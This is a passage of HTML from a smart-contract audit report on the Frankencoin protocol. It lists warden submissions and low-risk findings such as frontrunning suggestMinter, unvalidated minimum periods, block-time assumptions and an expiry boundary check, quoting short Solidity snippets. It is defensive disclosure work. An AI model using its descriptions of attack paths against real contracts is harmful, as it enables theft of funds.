6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This is a re-current issue for most defi strategy to account loss in a mev-resistent way, a few possible solutions:</p>\n<ol>\n<li>create an additional window for MintingHub::end to be called by a whitelist, before it opens up to the public. The whitelist is trusted bot that will call <code>end</code> through private mempool.</li>\n<li>amortised the loss in the next coming period of time instead in 1 go with a <code>MAX_SPEED</code>.</li>\n<li>create an withdrawal queue such that the final withdrawal price is dependent on the upcoming equity change(s)</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/48#issuecomment-1529060550\">luziusmeisser (Frankencoin) acknowledged</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 81 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/597\">report highlighted below</a> by <strong>juancito</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/984\">rbserver</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/970\">0xAgro</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/964\">EloiManuel</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/953\">joestakey</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/947\">MohammedRizwan</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/944\">nadin</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/936\">aria</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/928\">MiloTruck</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/920\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/912\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/911\">slvDev</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/901\">pontifex</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/894\">giovannidisiena</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/892\">Arz</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/882\">decade</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/872\">karanctf</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/862\">m9800</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/852\">Kaysoft</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/847\">DedOhWale</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/837\">qpzm</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/835\">tnevler</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/814\">Udsen</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/804\">mov</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/798\">santipu_</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/791\">Madalad</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/787\">DishWasher</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/776\">parlayan_yildizlar_takimi</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/771\">ltyu</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/768\">ChainHunters</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/755\">xmxanuel</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/736\">SanketKogekar</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/707\">3dgeville</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/698\">niser93</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/683\">CodeFoxInc</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/678\">bin2chen</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/667\">LeoGold</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/659\">0xTheC0der</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/656\">matrix_0wl</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/636\">yixxas</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/615\">IceBear</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/599\">SaharDevep</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/588\">Inspex</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/581\">BenRai</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/538\">0xNorman</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/536\">BRONZEDISC</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/535\">Bauchibred</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/518\">ayden</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/510\">SolidityATL</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/499\">kodyvim</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/480\">catellatech</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/479\">ChrisTina</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/472\">BGSecurity</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/445\">evmboi32</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/424\">LewisBroadhurst</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/419\">descharre</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/390\">Bauer</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/354\">p0wd3r</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/350\">mrpathfindr</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/346\">wonjun</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/343\">Jorgect</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/299\">Nyx</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/274\">W0RR1O</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/270\">berlin-101</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/269\">8olidity</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/265\">eyexploit</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/261\">0xnev</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/257\">0xStalin</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/236\">codeslide</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/232\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/221\">RaymondFam</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/216\">shealtielanz</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/201\">pavankv</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/188\">georgits</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/152\">fatherOfBlocks</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/133\">crc32</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/129\">Sathish9098</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/108\">Polaris_tow</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/18\">0xWaitress</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/12\">ravikiranweb3</a>, and\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/2\">0xhacksmithh</a>\n.</em></p>\n<h2 id=\"low-issues\" style=\"position:relative;\"><a href=\"#low-issues\" aria-label=\"low issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Issues</h2>\n<p>• [L-01] Frontrunning suggestMinter may lead to stolen funds</p>\n<p>• [L-02] Not validating <code>MIN_APPLICATION_PERIOD</code> can lead to stolen funds</p>\n<p>• [L-03] <code>MIN_HOLDING_DURATION</code> will not hold a correct value if deployed on other network</p>\n<p>• [L-04] Positions should be expired when <code>block.timestamp = expiration</code></p>\n<p>• [L-05] No pause mechanism in case of depeg of XCHF token</p>\n<p>• [L-06] Tokens with very large decimals will not work as expected</p>\n<p>• [L-07] minBid can be bypassed to bid indefinitely for small amounts</p>\n<p>• [L-08] ERC-777 tokens can lead to re-entrancy vulnerabilities</p>\n<p>• [L-09] Challenges can be split after they end</p>\n<h2 id=\"l-01-frontrunning-suggestminter-may-lead-to-stolen-funds\" style=\"position:relative;\"><a href=\"#l-01-frontrunning-suggestminter-may-lead-to-stolen-funds\" aria-label=\"l 01 frontrunning suggestminter may lead to stolen funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Frontrunning suggestMinter may lead to stolen funds</h2>\n<p><code>Frankencoin::suggestMinter</code> does not validate <code>_applicationPeriod</code> and <code>_applicationFee</code> when <code>totalSupply()</code> is <code>0</code></p>\n<p>This can be useful for the admins to create the first minter.</p>\n<p>Nevertheless the function can be called by anyone until some tokens are minted.</p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In the worst scenario the admins can deploy all contracts. Send funds to the <code>StablecoinBridge</code>, and then decide to suggest the first minter and mint some coins.</p>\n<p>An attacker can call <code>suggestMinter</code> as soon as the contracts are created and some funds are sent to burn them and retrieve the paired stable coin provided by the bridge.</p>\n<p>On a less dramatic scenario anyone can frontrun the <code>suggestMinter</code> function, which will create a new minter for the attacker. This will result in the contracts having to be re-deployed.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>Frankencoin::suggestMinter</code> does not validate <code>_applicationPeriod</code> and <code>_applicationFee</code> when <code>totalSupply()</code> is <code>0</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">MIN_APPLICATION_PERIOD</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PeriodTooShort</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">MIN_FEE</span><span class=\"mtk1\">  &amp;&amp; </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FeeTooLow</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L84-L85\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add some admin permission to assign the first minter, or deploy everything through a deployer contract, and call <code>suggestMinter</code> in it, so that it cannot be front-runned.</p>\n<h2 id=\"l-02-not-validating-min_application_period-can-lead-to-stolen-funds\" style=\"position:relative;\"><a href=\"#l-02-not-validating-min_application_period-can-lead-to-stolen-funds\" aria-label=\"l 02 not validating min_application_period can lead to stolen funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Not validating <code>MIN_APPLICATION_PERIOD</code> can lead to stolen funds</h2>\n<p><code>MIN_APPLICATION_PERIOD</code> is defined on the <code>Frankencoin</code> constructor and is immutable. In case the contracts are deployed with <code>_minApplicationPeriod = 0</code>, an attacker can become a minter, burn the token and steal assets on other contracts like the <code>StablecoinBridge</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minApplicationPeriod</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">MIN_APPLICATION_PERIOD</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_minApplicationPeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Equity</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L59-L62\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate that the <code>MIN_APPLICATION_PERIOD</code> is greater than some minimum value in the constructor.</p>\n<h2 id=\"l-03-min_holding_duration-will-not-hold-a-correct-value-if-deployed-on-other-network\" style=\"position:relative;\"><a href=\"#l-03-min_holding_duration-will-not-hold-a-correct-value-if-deployed-on-other-network\" aria-label=\"l 03 min_holding_duration will not hold a correct value if deployed on other network permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] <code>MIN_HOLDING_DURATION</code> will not hold a correct value if deployed on other network</h2>\n<p><code>MIN_HOLDING_DURATION</code> in <code>Equity</code> is calculated assuming that it will be only deployed in Ethereum Mainnet, where each block is added every 12 seconds.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MIN_HOLDING_DURATION</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">90</span><span class=\"mtk1\">*</span><span class=\"mtk7\">7200</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk12\">BLOCK_TIME_RESOLUTION_BITS</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Set to 5 for local testing</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L59\">Link to code</a></p>\n<p>That will not be true if the contract is deployed on other networks</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Define <code>MIN_HOLDING_DURATION</code> via a variable in the constructor, or add a comment on the code make clear this issue.</p>\n<h2 id=\"l-04-positions-should-be-expired-when-blocktimestamp--expiration\" style=\"position:relative;\"><a href=\"#l-04-positions-should-be-expired-when-blocktimestamp--expiration\" aria-label=\"l 04 positions should be expired when blocktimestamp  expiration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Positions should be expired when <code>block.timestamp = expiration</code></h2>\n<p>The <code>alive</code> modifier in <code>Position</code> does not revert when <code>block.timestamp == expiration</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Expired</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L367\">Link to code</a></p>\n<p>This by itself only allows positions to operate on that exact block, but if the <code>noCooldown</code> modifier had the same issue, it could lead to exploits when all values are equal.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">cooldown</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Hot</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>It was noticed that some changes to <code>></code> operatos have been performed when replacing <code>require</code> statements with <code>revert</code> statements.</p>\n<p>It is important to check this subtle differences to prevent any issue.</p>\n<p>On top of that, the <code>tryAvertChallenge</code> already checks <code>block.timestamp >= expiration</code> for expiration:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> check whether challenge can be averted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_collateralAmount</span><span class=\"mtk3\">   amount of collateral challenged (dec18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk3\">      bid amount in ZCHF (dec18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> true if challenge can be averted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tryAvertChallenge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateralAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span 